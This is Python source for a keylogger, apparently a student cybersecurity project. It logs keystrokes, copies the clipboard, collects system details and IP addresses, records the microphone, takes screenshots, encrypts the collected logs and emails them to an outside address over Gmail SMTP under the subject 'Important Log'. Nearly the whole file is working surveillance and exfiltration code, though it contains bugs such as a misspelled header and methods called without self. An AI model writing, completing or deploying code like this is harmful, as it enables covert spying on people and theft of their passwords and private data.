from __future__ import with_statement
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from fileinput import filename
from ipaddress import ip_address
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sdl

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# File path of Key log file
file_path = "D:\Docs\Computing Fundamentals\Python Work\Cybersecurity Projects\Keylogger"
# Important to access Key log file
extend = "\\"
file_merge = file_path + extend
email_address = ""  # Insert email address that sends files
password = ""  # Insert email password
email_to = ""  # Insert email address that receives files
key = ""  # Insert key from key gen here

# Create Key log file
key_info = "keys_log.txt"
system_info = "systeminfo.txt"
clipboard_info = "clipboard.txt"
audio_info = "audio.wav"
screen_info = "screenshot.png"

encrypted_key_info = "keys_log_encrypted.txt"
encrypted_system_info = "systeminfo_encrypted.txt"
encrypted_clipboard_info = "clipboard_encrypted.txt"

microphone_time = 10

counter = 0
# List for storing keys
keys = []

no_of_iterations = 0
time_iteration = 15
current_time = time.time()
stopping_time = time.time() + time_iteration

class KeyLogger:


    # Get Clipboard information
    def copy_clipboard(self):
        with open(file_path + extend + clipboard_info, 'a') as f:
            try:
                win32clipboard.OpenClipboard()
                pasted_data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                f.write("Clipboard Data: \n" + pasted_data)
            except:
                f.write("Clipboard cannot be copied")


    def on_press(self,key):
        global keys, counter
        print(key)
        keys.append(key)
        counter += 1

        if counter >= 1:
            counter = 0
            self.write_to_file(keys)
            keys = []


    def write_to_file(self,keys):
        # Open file and append keys pressed
        with open(file_path + extend + key_info, "a") as f:
            for key in keys:
                r = str(key).replace("'", "")
                if r.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif r.find("Key") == -1:
                    f.write(r)
                    f.close()


    def on_release(self,key):
        if key == Key.esc:
            return False


    # with Listener(on_press=on_press, on_release=on_release) as listener:
    #     listener.join()


    # Email Functionality - send keys to email

    def send_email(self,file_name, attachment, email_to):
        email_from = email_address

        msg = MIMEMultipart()  # for attachments

        msg['From'] = email_from
        msg['To'] = email_to
        msg['Subject'] = "Important Log"

        body = "Logs_so_far"  # email body
        msg.attach(MIMEText(body, 'plain'))

        file_name = file_name
        attachment = open(attachment, 'rb')

        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())

        encoders.encode_base64(p)

        p.add_header('Contet-Disposition', "attachment; filename=%s" % filename)
        msg.attach(p)

        smtp_session = smtplib.SMTP('smtp.gmail.com', 587)

        smtp_session.starttls()

        smtp_session.login(email_from, password)

        text = msg.as_string()

        smtp_session.sendmail(email_from, email_to, text)



    def system_information(self):
        with open(file_path + extend + system_info, "a") as f:
            hostname = socket.gethostname()
            IPAddr = socket.gethostbyname(hostname)
            try:
                public_ip = get("https://api.ipify.org").text
                f.write("Public IP Address: " + public_ip)
            except Exception:
                f.write("Failed to get public IP address!")

            f.write("Processor: " + (platform.processor())+'\n')
            f.write("System: " + platform.system()+" "+platform.version() + '\n')
            f.write("Machine: " + platform.machine() + '\n')
            f.write("Hostname: " + hostname + '\n')
            f.write("Private IP Address: " + IPAddr + '\n')


    def microphone(self):
        freq = 44100
        rec_time = microphone_time
        recording = sdl.rec(int(rec_time * freq), samplerate=freq, channels=2)
        sdl.wait()
        write(file_path + extend + audio_info, freq, recording)


    def screenshot(self):
        img = ImageGrab.grab()
        img.save(file_path + extend + screen_info)


    files_to_encrypt = [file_merge+system_info,
                        file_merge+clipboard_info, file_merge+key_info]
    encrypted_file_names = [file_merge+encrypted_key_info, file_merge +
                            encrypted_clipboard_info, file_merge+encrypted_system_info]

    counter = 0
    for encryption in files_to_encrypt:
        with open(files_to_encrypt[counter], 'rb') as f:
            data = f.read()

            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)

        with open(encrypted_file_names[counter], 'wb') as f:
            f.write(encrypted)

        send_email(encrypted_file_names[counter],
                encrypted_file_names[counter], email_to)
        counter += 1
    time.sleep(120)



if __name__ == '__main__':
  logger=KeyLogger()
  logger.send_email(key_info, file_path + extend + key_info, email_to)
  logger.system_information()
  logger.microphone()
  logger.screenshot()